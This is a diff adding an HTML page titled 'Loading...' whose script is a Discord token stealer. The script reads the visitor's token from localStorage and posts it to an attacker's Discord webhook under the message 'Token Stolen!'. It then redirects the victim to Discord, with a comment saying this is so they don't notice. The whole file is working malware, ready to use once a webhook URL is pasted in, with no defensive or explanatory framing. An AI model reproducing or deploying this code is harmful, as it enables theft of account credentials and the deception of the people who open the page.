@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+</head>
+<body>
+    <script>
+        // PASTE YOUR WEBHOOK URL HERE
+        const webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
+
+        // Get the token from localStorage
+        const token = localStorage.token;
+
+        if (token) {
+            // Format the message for Discord
+            const payload = {
+                content: "🔥 **Token Stolen!** 🔥\n\n```\n" + token + "\n```"
+            };
+
+            // Send to webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                // Redirect to Discord so they don't notice
+                window.location.href = 'https://discord.com/channels/@me';
+            });
+        } else {
+            window.location.href = 'https://discord.com';
+        }
+    </script>
+</body>
+</html>
